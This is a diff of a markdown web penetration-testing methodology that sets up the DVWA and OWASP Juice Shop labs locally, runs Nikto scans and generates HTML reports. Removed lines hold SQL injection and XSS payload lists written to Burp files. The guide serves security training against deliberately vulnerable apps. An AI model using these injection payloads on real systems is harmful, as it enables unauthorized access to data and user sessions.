@@ -1,328 +1,44 @@
-# Cybersecurity Web App Incident Response 
-## 🛡️ Web Application Vulnerability Assessment Project
+# Web Application Penetration Testing Methodology
+## 🛡️ Systematic Security Assessment Using Kali Linux
 
 ## 📋 Project Overview
 
-### Why This Case Study Matters
+### Why This Methodology Matters
 
-In today's digital landscape, web applications have become the backbone of modern business operations. From e-commerce platforms to banking systems, social media networks to healthcare portals, millions of users interact with web applications daily, entrusting them with their most sensitive personal and financial information.
+Web applications process **$5.7 trillion** in annual e-commerce transactions and serve **4.9 billion** daily internet users. With **75% of cyberattacks** targeting the application layer and average breach costs reaching **$4.88 million**, systematic security testing is critical for business survival.
 
-#### The Universal Nature of Web Applications
-
-| **USERS: 4.9B Internet Users Daily** | **CATEGORIES: Critical Infrastructure** |
-|---------------------------------------|------------------------------------------|
-| • **20+** Daily App Interactions     | 🔒 **Banking & Healthcare & Government** |
-| • **$5.7T** E-commerce Volume        | 📱 **Social Platforms & Communication** |
-| • **95%** Business Dependency        | 💳 **Payment Systems & Wallets**        |
-| • **2B+** Mobile Sessions            | ☁️ **Cloud Infrastructure & SaaS**      |
-
-**Key Statistics:**
-- **4.9 billion people** use the internet daily
-- **95% of businesses** depend on web applications  
-- **$5.7 trillion** in annual e-commerce sales
-
-#### The Trust Factor
+#### Testing Approach: Three-Phase Methodology
 
 ```mermaid
-%%{init: {
-  'theme': 'base',
-  'themeVariables': {
-    'primaryColor': '#0f172a',
-    'primaryTextColor': '#f8fafc',
-    'primaryBorderColor': '#475569',
-    'lineColor': '#64748b',
-    'background': '#0f172a',
-    'mainBkg': '#1e293b',
-    'secondBkg': '#334155'
-  }
-}}%%
-quadrantChart
-    title Trust vs Risk Matrix in Web Applications
-    x-axis Low Trust --> High Trust
-    y-axis Low Risk --> High Risk
-    
-    quadrant-1 High Risk, High Trust
-    quadrant-2 High Risk, Low Trust  
-    quadrant-3 Low Risk, Low Trust
-    quadrant-4 Low Risk, High Trust
-    
-    Financial Data: [0.9, 0.9]
-    Personal Info: [0.75, 0.75] 
-    Business Data: [0.3, 0.8]
-    Authentication: [0.8, 0.4]
-    Behavioral Data: [0.25, 0.25]
+graph LR
+    A[📊 Phase 1: Reconnaissance] --> B[📋 Phase 2: Validation]
+    B --> C[🎯 Phase 3: Exploitation]
+    A --> D[Nikto Scanner]
+    B --> E[OWASP ZAP]
+    C --> F[Burp Suite]
+    D --> G[reconnaissance_report.html]
+    E --> H[validation_report.html]
+    F --> I[exploitation_report.html]
 ```
 
-**Data Categories Analysis:**
-- **Financial Data**: Banking, payments, credit cards (Highest risk/trust)
-- **Personal Information**: Names, addresses, phone numbers  
-- **Business Data**: Proprietary info, trade secrets
-- **Authentication**: Passwords, session tokens
-- **Behavioral Data**: Usage patterns, preferences (Lower risk zone)
-
-#### The Vulnerability Reality
-
-| **Threat Landscape** | **Impact** |
-|----------------------|------------|
-| 🎯 **43%** target small businesses | Small business vulnerability |
-| 🌐 **26%** breaches via web apps | Application layer focus |
-| 💰 **$4.88M** average breach cost | Financial impact |
-| 🔥 **75%** attacks at app layer | Attack vector concentration |
-
-**Cyber Threat Evolution Timeline:**
-```
-2020 ──────────────────── 2022 ──────────────────── 2024 ──────────────────── 2026
-│                         │                         │                         │
-│ Web App Attacks: 22%    │ Web App Attacks: 24%    │ Web App Attacks: 26%    │ Projected: 30%
-│ Small Biz Targets: 35%  │ Small Biz Targets: 39%  │ Small Biz Targets: 43%  │ Targets: 48%
-│ Avg Cost: $3.86M        │ Avg Cost: $4.35M        │ Avg Cost: $4.88M        │ Cost: $5.5M
-│                         │                         │ App Layer Focus: 75%    │
-```
-
-## 🎯 Vulnerability Focus Areas
-
-### Primary Vulnerabilities
-
-#### 1. **SQL Injection (SQLi)**
-- **OWASP Ranking**: #3 in OWASP Top 10 2021
-- **Prevalence**: Found in 19% of web applications
-- **Business Impact**: 
-  - Complete database compromise
-  - Unauthorized data access/theft
-  - Data manipulation/deletion
-  - Potential system takeover
-
-#### 2. **Cross-Site Scripting (XSS)**
-- **OWASP Ranking**: #7 in OWASP Top 10 2021
-- **Prevalence**: Present in 23% of web applications
-- **Business Impact**:
-  - Session hijacking and account takeover
-  - Malware distribution
-  - Defacement and reputation damage
-  - Phishing attacks against users
-
-#### 3. **Broken Session Management**
-- **OWASP Category**: Broken Authentication (#2 in OWASP Top 10 2021)
-- **Prevalence**: 14% of applications have authentication flaws
-- **Business Impact**:
-  - Unauthorized account access
-  - Session fixation attacks
-  - Identity theft
-  - Privilege escalation
-
-### Vulnerability Impact Overview
-
-```
-                    Web Application Vulnerabilities
-                             │
-         ┌───────────────────┼───────────────────┐
-         │                   │                   │
-    SQL Injection       Cross-Site         Broken Auth
-    Prevalence: 19%     Scripting          Prevalence: 14%
-         │              Prevalence: 23%          │
-         │                   │                   │
-    ┌────┴───────┐      ┌────┴──────┐       ┌────┴─────┐
-    │  Database  │      │  Session  │       │ Identity │
-    │ Compromise │      │ Hijacking │       │   Theft  │
-    └────────────┘      └───────────┘       └──────────┘
-         │                   │                   │
-         └───────────────────┼───────────────────┘
-                             │
-                    Business Impact
-                    ┌────────┴──────────┐
-                    │   Financial Loss  │
-                    │  Regulatory Fines │
-                    │   Customer Churn  │
-                    │ Reputation Damage │
-                    └───────────────────┘
-```
-
-### Secondary Impact Scenarios
-
-#### 4. **Session Hijacking**
-- **Attack Vector**: Exploitation of session tokens through XSS or network sniffing
-- **Consequences**: Complete account takeover, unauthorized transactions
-- **Financial Impact**: Average of $1.2M per incident
-
-#### 5. **Data Breaches**
-- **Attack Vector**: SQL injection leading to mass data extraction
-- **Consequences**: Regulatory fines, legal liability, customer loss
-- **Cost Breakdown**: 38% of total breach cost attributed to lost business
-
-#### 6. **Denial of Service (DoS)**
-- **Attack Vector**: Resource exhaustion through SQL injection or XSS
-- **Consequences**: Service unavailability, revenue loss, SLA violations
-- **Downtime Cost**: $5,600 per minute for large enterprises
-
-## 🧪 Testing Environments
-
-### Comparative Analysis
-
-```
-┌─────────────────┬────────────────────┬─────────────────────────┐
-│ Feature         │ DVWA               │ OWASP Juice Shop        │
-├─────────────────┼────────────────────┼─────────────────────────┤
-│ Installation    │ Pre-installed      │ Requires Node.js setup  │
-│                 │ in Kali            │                         │
-├─────────────────┼────────────────────┼─────────────────────────┤
-│ Technology      │ PHP/MySQL          │ Node.js/SQLite          │
-│ Stack           │                    │                         │
-├─────────────────┼────────────────────┼─────────────────────────┤
-│ Vulnerability   │ Traditional web    │ Modern app              │
-│ Coverage        │ vulnerabilities    │ vulnerabilities         │
-├─────────────────┼────────────────────┼─────────────────────────┤
-│ Learning Curve  │ Beginner-friendly  │ Intermediate-advanced   │
-├─────────────────┼────────────────────┼─────────────────────────┤
-│ Realistic       │ Educational focus  │ Business-realistic      │
-│ Scenarios       │                    │                         │
-└─────────────────┴────────────────────┴─────────────────────────┘
-```
-
-### Option 1: DVWA (Damn Vulnerable Web Application)
-- **Advantages**: Pre-installed in Kali Linux, well-documented vulnerabilities
-- **Use Case**: Controlled learning environment with adjustable security levels
-- **Target Audience**: Beginners to intermediate penetration testers
-
-### Option 2: OWASP Juice Shop
-- **Advantages**: Modern application stack, realistic scenarios, gamified challenges
-- **Use Case**: Advanced testing with contemporary web technologies
-- **Target Audience**: Intermediate to advanced security professionals
-
-## 🔧 Tools Arsenal
-
-### Tool Comparison Matrix
-
-```
-┌─────────────────┬─────────────────────┬─────────────────────────┬───────────────────┐
-│ Tool            │ Primary Purpose     │ Market Share/Usage      │ Key Strengths     │
-├─────────────────┼─────────────────────┼─────────────────────────┼───────────────────┤
-│ Burp Suite      │ Manual testing,     │ 87% of pen testers      │ Proxy, repeater,  │
-│ Community       │ request             │                         │ intruder          │
-│ Edition         │ manipulation        │                         │ functionality     │
-├─────────────────┼─────────────────────┼─────────────────────────┼───────────────────┤
-│ OWASP ZAP       │ Automated scanning  │ 50,000+ GitHub stars    │ Free scanner,     │
-│                 │ and manual testing  │                         │ extensive API,    │
-│                 │                     │                         │ user-friendly     │
-├─────────────────┼─────────────────────┼─────────────────────────┼───────────────────┤
-│ Nikto           │ Web server scanning │ 6,700+ vulnerability    │ Fast recon,       │
-│                 │ and configuration   │ checks                  │ comprehensive     │
-│                 │ testing             │                         │ checks            │
-└─────────────────┴─────────────────────┴─────────────────────────┴───────────────────┘
-```
-
-### Penetration Testing Tool Workflow
-
-```
-Reconnaissance ───────── Analysis ───────────── Exploitation ────────── Reporting
-      │                     │                         │                      │
-   ┌──┴────┐         ┌──────┴──────┐           ┌──────┴─────┐         ┌──────┴─────┐
-   │ Kali  │         │ Burp  Suite │           │ Burp Suite │         │ Burp Suite │
-   │ Linux │ ──────► │  OWASP ZAP  │ ────────► │  OWASP ZAP │ ──────► │  OWASP ZAP │
-   │ Tools │         │    Nikto    │           │    Payld   │         │    Report  │
-   └───────┘         └─────────────┘           └────────────┘         └────────────┘
-        3                  4,5                       4,5                    3,4
-     Rating              Rating                     Rating                 Rating
-```
-
-## 📊 Impact Assessment Framework
-
-### Technical Impact Categories
-
-```
-Critical Impact ($1M+) ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ CVSS: 9.0-10.0
-         │                Complete System Compromise
-         │
-High Impact ($100K-$1M) ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ CVSS: 7.0-8.9
-         │                Sensitive Data Exposure
-         │
-Medium Impact ($10K-$100K) ━━━━━━━━━━━━━━━━━━━━━━━━━━━━ CVSS: 4.0-6.9
-         │                Limited Data Access
-         │
-Low Impact (<$10K) ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ CVSS: 0.1-3.9
-                   Information Disclosure
-```
-
-```
-┌────────────┬─────────────────────────────┬─────────────────────────┬──────────────┐
-│ Severity   │ Description                 │ Business Impact         │ CVSS Range   │
-├────────────┼─────────────────────────────┼─────────────────────────┼──────────────┤
-│ Critical   │ Complete system compromise  │ $1M+ potential loss     │ 9.0-10.0     │
-│ High       │ Sensitive data exposure     │ $100K-$1M potential     │ 7.0-8.9      │
-│ Medium     │ Limited data access         │ $10K-$100K potential    │ 4.0-6.9      │
-│ Low        │ Information disclosure      │ <$10K potential loss    │ 0.1-3.9      │
-└────────────┴─────────────────────────────┴─────────────────────────┴──────────────┘
-```
-
-### Business Risk Calculation Model
-
-#### Financial Impact Components (IBM Security, 2024)
-- **Detection and Escalation** (27%): $1.32M average
-- **Notification** (7%): $0.34M average  
-- **Post-breach Response** (28%): $1.37M average
-- **Lost Business** (38%): $1.85M average
-
-#### Compliance Implications by Regulation
-
-| **Regulation** | **Maximum Penalty** | **Authority** |
-|----------------|---------------------|---------------|
-| **🇪🇺 GDPR** | €20M or 4% of annual turnover | European Commission |
-| **💳 PCI-DSS** | $5,000-$100,000 per month | PCI Security Standards Council |
-| **📊 SOX** | $5M fine + 20 years imprisonment | SEC |
-| **🏥 HIPAA** | $100-$50,000 per violation<br/>Max $1.5M annually | HHS |
-
-## 🔒 Remediation Guidelines
-
-### Defense in Depth Architecture
-
-```
-                          Security Control Implementation
-
-Layer 1: Preventive Controls          Layer 2: Detective Controls
-┌─────────────────────────┐          ┌─────────────────────────┐
-│  • Input Validation     │ ────────►│  • Security Logging     │
-│                         │          │                         │
-│  • Authentication       │ ────────►│  • Real-time Monitoring │
-│                         │          │                         │
-│  • Authorization        │ ────────►│  • Anomaly Detection    │
-│                         │          │                         │
-│  • Encryption           │ ────────►│  • Threat Intelligence  │
-└─────────────────────────┘          └─────────────────────────┘
-            │                                    │
-            ▼                                    ▼
-Layer 3: Corrective Controls          Layer 4: Compensating Controls
-┌─────────────────────────┐          ┌─────────────────────────┐
-│  • Incident Response    │          │  • Web App Firewall     │
-│                         │          │                         │
-│  • Automated Recovery   │          │  • Rate Limiting        │
-│                         │          │                         │
-│  • Backup Systems       │          │  • Content Security     │
-│                         │          │    Policy               │
-│  • Patch Management     │          │                         │
-│                         │          │  • Security Headers     │
-└─────────────────────────┘          └─────────────────────────┘
-```
+**Phase Objectives:**
+- **Phase 1 (Reconnaissance)**: Discover attack surface and potential vulnerabilities
+- **Phase 2 (Validation)**: Verify vulnerabilities and assess exploitability  
+- **Phase 3 (Exploitation)**: Demonstrate business impact through controlled exploitation
 
 ---
 
-# 🚀 Environment Setup and Configuration
+## 🚀 Environment Setup and Configuration
 
-## Prerequisites
+### System Requirements
 
-### System Resource Requirements
-
-```
-┌─────────────┬─────────────┬─────────────────┐
-│  Component  │   Minimum   │   Recommended   │
-├─────────────┼─────────────┼─────────────────┤
-│ CPU         │ 2 cores     │ 4+ cores        │
-│ RAM         │ 4GB         │ 8GB+            │
-│ Storage     │ 20GB free   │ 40GB+ free      │
-│ Network     │ 10 Mbps     │ 100 Mbps+       │
-└─────────────┴─────────────┴─────────────────┘
-```
-
-### Initial Kali Linux Setup
 ```bash
+# Minimum system specifications
+CPU: 4+ cores
+RAM: 8GB+
+Storage: 40GB+ free space
+Network: 100 Mbps+
+
 # Update system packages
 sudo apt update && sudo apt upgrade -y
 
@@ -334,15 +50,18 @@ nikto -Version
 # Install missing tools if necessary
 sudo apt install burpsuite zaproxy nikto -y
 
-# Verify installation success
+# Install Python dependencies for HTML report generation
+pip3 install --upgrade pip
+pip3 install python-owasp-zap-v2.4 requests beautifulsoup4
+
 echo "Tool verification complete"
 ```
 
-## 🎯 DVWA Setup and Configuration
+### Target Environment Setup
 
-### Step 1: Install and Configure DVWA
+#### DVWA (Traditional Web Applications)
 ```bash
-# Install DVWA package
+# Install and configure DVWA
 sudo apt update
 sudo apt install dvwa -y
 
@@ -357,45 +76,25 @@ sudo systemctl enable mysql
 # Verify service status
 sudo systemctl status apache2
 sudo systemctl status mysql
-```
 
-### Step 2: Database Configuration
-```bash
-# Access MySQL as root user
-sudo mysql -u root
-
-# Execute database setup commands
+# Database configuration
+sudo mysql -u root -e "
 CREATE DATABASE dvwa;
 CREATE USER 'dvwa'@'localhost' IDENTIFIED BY 'p@ssw0rd';
 GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost';
-FLUSH PRIVILEGES;
-EXIT;
+FLUSH PRIVILEGES;"
+
+# Configure DVWA settings
+sudo sed -i "s/\$_DVWA\['db_password'\] = 'p@ssw0rd';/\$_DVWA['db_password'] = 'p@ssw0rd';/" /etc/dvwa/config/config.inc.php
+
+# Initialize DVWA
+curl -X POST http://127.0.0.1/dvwa/setup.php -d "create_db=Create / Reset Database"
+
+echo "✅ DVWA accessible at: http://127.0.0.1/dvwa/"
+echo "   Default credentials: admin/password"
 ```
 
-### Step 3: Configure DVWA Settings
-```bash
-# Edit DVWA configuration file
-sudo nano /etc/dvwa/config/config.inc.php
-```
-
-Update the following database settings:
-```php
-$_DVWA['db_user'] = 'dvwa';
-$_DVWA['db_password'] = 'p@ssw0rd';
-$_DVWA['db_database'] = 'dvwa';
-$_DVWA['db_server'] = '127.0.0.1';
-```
-
-### Step 4: Initialize DVWA
-1. Open web browser and navigate to: `http://127.0.0.1/dvwa/setup.php`
-2. Click "Create / Reset Database" button
-3. Navigate to login page: `http://127.0.0.1/dvwa/login.php`
-4. Login with default credentials: `admin` / `password`
-5. Navigate to DVWA Security settings and set level to "Low"
-
-## 🧃 OWASP Juice Shop Setup
-
-### Step 1: Install Node.js and npm
+#### OWASP Juice Shop (Modern Applications)
 ```bash
 # Install Node.js version 18.x (LTS)
 curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
@@ -405,1769 +104,1685 @@ sudo apt-get install -y nodejs
 node --version
 npm --version
 
-# Expected output: Node v18.x.x, npm 9.x.x
-```
-
-### Step 2: Install OWASP Juice Shop
-```bash
-# Option 1: Global npm installation (recommended)
+# Install OWASP Juice Shop
 npm install -g juice-shop
 
-# Option 2: Docker installation (alternative)
-sudo apt install docker.io -y
-sudo systemctl start docker
-sudo docker pull bkimminich/juice-shop
+# Start Juice Shop
+juice-shop &
 
-# Option 3: Local development setup
-git clone https://github.com/juice-shop/juice-shop.git
-cd juice-shop
-npm install
+# Verify accessibility
+sleep 10
+if curl -s http://localhost:3000 > /dev/null; then
+    echo "✅ Juice Shop accessible at: http://localhost:3000"
+else
+    echo "⚠️  Try manually: juice-shop &"
+fi
 ```
-
-### Step 3: Run Juice Shop
-```bash
-# Method 1: If installed via npm globally
-juice-shop
-
-# Method 2: If using Docker
-sudo docker run --rm -p 3000:3000 bkimminich/juice-shop
-
-# Method 3: If cloned from repository
-cd juice-shop
-npm start > /dev/null 2>&1 &
-```
-
-### Step 4: Stop Juice Shop
-```bash
-# Kill it (replace %1 with actual job number)
-kill %1
-# or kill by process ID
-kill 424905
-```
-
-### Step 4: Access and Configure Juice Shop
-- Open web browser and navigate to: `http://localhost:3000`
-- Create a test user account for penetration testing
-- Explore the application interface and functionality
-- Note: Application runs on port 3000 by default
 
 ---
 
-# 🔧 Comprehensive Web Application Security Scanner Setup Guide
+# 📊 Phase 1: Reconnaissance and Discovery
 
-## 1. 🎯 Burp Suite - Interactive Web Application Security Testing
+## Objective
+Systematically discover the attack surface, enumerate services, and identify potential security weaknesses without actively exploiting vulnerabilities.
 
-### What is Burp Suite?
-Burp Suite is an integrated platform for performing security testing of web applications. It acts as a proxy between your browser and the target application, allowing you to intercept, modify, and analyze HTTP requests and responses.
+## Tool: Nikto Web Scanner
 
-### Prerequisites
+### Methodology: Comprehensive Infrastructure Scanning
+
+#### Step 1: Basic Reconnaissance
 ```bash
-# Ensure Burp Suite is installed
-sudo apt update
-sudo apt install burpsuite
+# Create output directory
+mkdir -p pentest_results/phase1_reconnaissance
+cd pentest_results/phase1_reconnaissance
+
+# Basic scan with HTML output
+nikto -h http://127.0.0.1/dvwa/ -o dvwa_reconnaissance.html -Format htm
+
+# Advanced scan with all plugins
+nikto -h http://127.0.0.1/dvwa/ -Plugins @@ALL -o dvwa_comprehensive.html -Format htm
+
+# Modern application scan
+nikto -h http://localhost:3000 -o juiceshop_reconnaissance.html -Format htm
 ```
 
-### Step 1: Basic Manual Scanning
-
-#### 1.1 Launch Burp Suite
-```bash
-# Launch Burp Suite Community Edition
-burpsuite &
-```
-
-#### 1.2 Initial Configuration (UI Steps)
-1. **Start Burp Suite**
-   - Click "Next" on the startup screen
-   - Select "Use Burp defaults" for project options
-   - Click "Start Burp"
-
-2. **Configure Browser Proxy**
-   - In Firefox: Go to Settings → Network Settings → Manual proxy configuration
-   - Set HTTP Proxy: `127.0.0.1` Port: `8080`
-   - Check "Use this proxy server for all protocols"
-
-3. **Install Burp CA Certificate**
-   - Navigate to `http://burp` in your browser
-   - Click "CA Certificate" to download
-   - In Firefox: Settings → Privacy & Security → Certificates → View Certificates
-   - Import the downloaded certificate
-
-#### 1.3 Manual Testing Process
-1. **Navigate Target Application**
-   - Go to your target (e.g., `http://localhost:3000` for Juice Shop)
-   - Browse through different pages and features
-   - All traffic will be captured in Burp's "Target" tab
-
-2. **Analyze Captured Requests**
-   - Go to "Target" tab → "Site map"
-   - Review all discovered endpoints
-   - Right-click interesting requests → "Send to Repeater"
-
-3. **Manual Testing**
-   - Use "Repeater" tab to modify and resend requests
-   - Use "Intruder" tab for automated parameter fuzzing
-
-### Step 2: Automated Payload Generation
-
-#### 2.1 Create Payload Setup Script
-**Filename:** `setup_burp_payloads.sh`
-
+#### Step 2: Automated Reconnaissance Script
 ```bash
 #!/bin/bash
-# Burp Suite Payload Generator
-# Creates organized payload lists for common web vulnerabilities
+# File: phase1_reconnaissance.sh
 
-# Create custom SQL injection payload list
-mkdir -p ~/.config/burp/payloads
-cat > ~/.config/burp/payloads/sql_injection.txt << 'EOF'
-' OR '1'='1
-' OR '1'='1'--
-' OR '1'='1'/*
-admin'--
-admin'/*
-' OR 1=1--
-' OR 1=1#
-' OR 1=1/*
-' UNION SELECT 1,2,3--
-' UNION SELECT null,null,null--
-' AND 1=1--
-' AND 1=2--
-1' OR '1'='1
-1' OR '1'='1'--
-1' OR '1'='1'/*
-EOF
+TARGET_URL="$1"
+OUTPUT_DIR="phase1_reconnaissance_$(date +%Y%m%d_%H%M%S)"
 
-# Create XSS payload list
-cat > ~/.config/burp/payloads/xss_payloads.txt << 'EOF'
-<script>alert('XSS')</script>
-<img src=x onerror=alert('XSS')>
-<svg onload=alert('XSS')>
-javascript:alert('XSS')
-"><script>alert('XSS')</script>
-'><script>alert('XSS')</script>
-<iframe src=javascript:alert('XSS')>
-<body onload=alert('XSS')>
-<input onfocus=alert('XSS') autofocus>
-<select onfocus=alert('XSS') autofocus>
-EOF
+if [ -z "$TARGET_URL" ]; then
+    echo "Usage: $0 <target_url>"
+    echo "Example: $0 http://127.0.0.1/dvwa/"
+    exit 1
+fi
 
-echo "Burp Suite payloads created successfully!"
-echo "SQL Injection payloads: ~/.config/burp/payloads/sql_injection.txt"
-echo "XSS payloads: ~/.config/burp/payloads/xss_payloads.txt"
+mkdir -p "$OUTPUT_DIR"
+cd "$OUTPUT_DIR"
+
+echo "🔍 Starting Phase 1: Reconnaissance for $TARGET_URL"
+
+# Basic vulnerability scan
+echo "Running basic vulnerability scan..."
+nikto -h "$TARGET_URL" -o "basic_scan.html" -Format htm
+
+# SSL/TLS assessment
+echo "Assessing SSL/TLS configuration..."
+nikto -h "$TARGET_URL" -ssl -o "ssl_assessment.html" -Format htm
+
+# Directory and file enumeration
+echo "Enumerating directories and files..."
+nikto -h "$TARGET_URL" -Cgidirs all -o "directory_enum.html" -Format htm
+
+# Comprehensive scan
+echo "Running comprehensive vulnerability assessment..."
+nikto -h "$TARGET_URL" -Plugins @@ALL -o "comprehensive_scan.html" -Format htm
+
+echo "✅ Phase 1 reconnaissance completed"
+echo "📂 Results saved in: $OUTPUT_DIR/"
 ```
 
-#### 2.2 Execute Payload Script
+#### Step 3: Enhanced HTML Report Generation
+```python
+#!/usr/bin/env python3
+# File: generate_reconnaissance_report.py
+
+import re
+import json
+from datetime import datetime
+from pathlib import Path
+
+def parse_nikto_output(nikto_file):
+    """Parse Nikto HTML output and extract vulnerabilities"""
+    
+    with open(nikto_file, 'r') as f:
+        content = f.read()
+    
+    # Extract vulnerabilities using regex patterns
+    vulnerabilities = []
+    
+    # Pattern for finding security issues
+    pattern = r'<td[^>]*>([^<]+)</td>.*?<td[^>]*>([^<]+)</td>.*?<td[^>]*>([^<]+)</td>'
+    matches = re.findall(pattern, content, re.DOTALL)
+    
+    for match in matches:
+        if any(keyword in match[0].lower() for keyword in ['directory', 'header', 'version', 'error']):
+            vulnerabilities.append({
+                'finding': match[0].strip(),
+                'location': match[1].strip(),
+                'description': match[2].strip()
+            })
+    
+    return vulnerabilities
+
+def generate_business_context(vulnerability):
+    """Generate business-friendly explanations for technical findings"""
+    
+    business_contexts = {
+        'directory indexing': {
+            'risk': 'HIGH',
+            'cwe': 'CWE-548: Information Exposure',
+            'explanation': 'Like leaving your office doors open with signs pointing to "Secret Files This Way." Attackers can browse your /config/ folder to find database passwords and API keys, browse /database/ to download complete user databases, and view /docs/ to understand your system architecture.',
+            'scenario': 'Real scenario: Hacker visits yoursite.com/config/ and downloads database credentials in 30 seconds.'
+        },
+        'x-frame-options': {
+            'risk': 'MEDIUM',
+            'cwe': 'CWE-1021: Clickjacking',
+            'explanation': 'Without X-Frame-Options protection, attackers can embed your website invisibly inside their malicious site. Users think they\'re clicking on a harmless button, but they\'re actually clicking hidden buttons on your admin panel.',
+            'scenario': 'Real scenario: User thinks they\'re clicking "Play Video" but actually clicked "Delete All Data" on your hidden admin panel.'
+        },
+        'x-content-type-options': {
+            'risk': 'MEDIUM',
+            'cwe': 'CWE-79: MIME Sniffing',
+            'explanation': 'Without X-Content-Type-Options, browsers might interpret uploaded images as executable scripts. An attacker uploads a malicious "image" that browsers treat as JavaScript code.',
+            'scenario': 'Real scenario: Attacker uploads "photo.jpg" that\'s actually malicious JavaScript, stealing user cookies when viewed.'
+        },
+        'server version': {
+            'risk': 'LOW',
+            'cwe': 'CWE-200: Information Disclosure',
+            'explanation': 'Revealing server software versions helps attackers identify specific vulnerabilities to exploit. Like advertising what type of lock you use on your front door.',
+            'scenario': 'Real scenario: Attacker sees "Apache 2.4.41" and searches for known exploits for that exact version.'
+        },
+        'login': {
+            'risk': 'LOW',
+            'cwe': 'CWE-200: Information Disclosure',
+            'explanation': 'While not dangerous alone, exposing your login page makes it easier for attackers to find and target with password-cracking tools.',
+            'scenario': 'Like putting a big "Admin Door" sign on your building - not harmful itself, but helps bad actors know where to focus attacks.'
+        }
+    }
+    
+    finding_lower = vulnerability['finding'].lower()
+    
+    for key, context in business_contexts.items():
+        if key in finding_lower:
+            return context
+    
+    # Default context for unknown vulnerabilities
+    return {
+        'risk': 'MEDIUM',
+        'cwe': 'CWE-200: Information Disclosure',
+        'explanation': 'This security finding requires further analysis to determine business impact.',
+        'scenario': 'Potential security risk identified requiring additional investigation.'
+    }
+
+def create_enhanced_html_report(vulnerabilities, target_url, output_file):
+    """Create enhanced HTML report with business context"""
+    
+    html_template = f"""
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phase 1: Reconnaissance Report</title>
+    <style>
+        body {{ font-family: 'Segoe UI', Tahoma, Arial, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }}
+        .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }}
+        .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px; border-radius: 8px; margin-bottom: 30px; }}
+        .header h1 {{ margin: 0; font-size: 2.5em; }}
+        .header p {{ margin: 10px 0 0 0; opacity: 0.9; }}
+        .summary {{ background: #f8f9fa; border-left: 5px solid #007bff; padding: 20px; margin: 20px 0; border-radius: 5px; }}
+        .vulnerability {{ background: #fff; border: 1px solid #ddd; margin: 15px 0; border-radius: 8px; overflow: hidden; }}
+        .vuln-header {{ padding: 15px; background: #f8f9fa; border-bottom: 1px solid #ddd; }}
+        .vuln-title {{ font-size: 1.2em; font-weight: bold; margin: 0; }}
+        .vuln-content {{ padding: 20px; }}
+        .risk-high {{ border-left: 5px solid #dc3545; }}
+        .risk-medium {{ border-left: 5px solid #ffc107; }}
+        .risk-low {{ border-left: 5px solid #28a745; }}
+        .risk-badge {{ padding: 4px 12px; border-radius: 20px; font-size: 0.9em; font-weight: bold; }}
+        .risk-high .risk-badge {{ background: #dc3545; color: white; }}
+        .risk-medium .risk-badge {{ background: #ffc107; color: #212529; }}
+        .risk-low .risk-badge {{ background: #28a745; color: white; }}
+        .scenario {{ background: #e3f2fd; border: 1px solid #90caf9; padding: 15px; border-radius: 5px; margin: 10px 0; }}
+        .scenario-title {{ font-weight: bold; color: #1976d2; margin-bottom: 8px; }}
+        .technical-details {{ background: #f8f9fa; padding: 15px; border-radius: 5px; margin: 10px 0; }}
+        .footer {{ margin-top: 30px; padding-top: 20px; border-top: 1px solid #ddd; color: #666; font-size: 0.9em; }}
+        .stats {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 20px 0; }}
+        .stat-card {{ background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); color: white; padding: 20px; border-radius: 8px; text-align: center; }}
+        .stat-number {{ font-size: 2em; font-weight: bold; }}
+        .stat-label {{ opacity: 0.9; }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔍 Phase 1: Reconnaissance Report</h1>
+            <p>Target: {target_url} | Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
+        </div>
+        
+        <div class="summary">
+            <h2>🎯 Executive Summary</h2>
+            <p>This reconnaissance phase identified <strong>{len(vulnerabilities)} security findings</strong> across the target web application. These findings represent potential attack vectors that require immediate attention to prevent unauthorized access, data breaches, and business disruption.</p>
+        </div>
+        
+        <div class="stats">
+            <div class="stat-card">
+                <div class="stat-number">{len([v for v in vulnerabilities if generate_business_context(v)['risk'] == 'HIGH'])}</div>
+                <div class="stat-label">High Risk Issues</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">{len([v for v in vulnerabilities if generate_business_context(v)['risk'] == 'MEDIUM'])}</div>
+                <div class="stat-label">Medium Risk Issues</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number">{len([v for v in vulnerabilities if generate_business_context(v)['risk'] == 'LOW'])}</div>
+                <div class="stat-label">Low Risk Issues</div>
+            </div>
+        </div>
+"""
+
+    # Add vulnerabilities
+    for vuln in vulnerabilities:
+        context = generate_business_context(vuln)
+        risk_class = f"risk-{context['risk'].lower()}"
+        
+        html_template += f"""
+        <div class="vulnerability {risk_class}">
+            <div class="vuln-header">
+                <div class="vuln-title">{vuln['finding']}</div>
+                <span class="risk-badge">{context['risk']} RISK</span>
+            </div>
+            <div class="vuln-content">
+                <div class="technical-details">
+                    <strong>📍 Location:</strong> {vuln['location']}<br>
+                    <strong>🔧 Classification:</strong> {context['cwe']}<br>
+                    <strong>📋 Technical Description:</strong> {vuln['description']}
+                </div>
+                
+                <h4>💼 Business Impact</h4>
+                <p>{context['explanation']}</p>
+                
+                <div class="scenario">
+                    <div class="scenario-title">🎯 Real-World Attack Scenario:</div>
+                    <em>{context['scenario']}</em>
+                </div>
+            </div>
+        </div>
+        """
+
+    html_template += f"""
+        <div class="footer">
+            <p><strong>🔧 Scan Methodology:</strong> Comprehensive Nikto web scanner assessment targeting infrastructure vulnerabilities, configuration issues, and information disclosure risks.</p>
+            <p><strong>📊 Next Phase:</strong> Proceed to Phase 2 (Validation) using OWASP ZAP to verify these findings and discover additional application-layer vulnerabilities.</p>
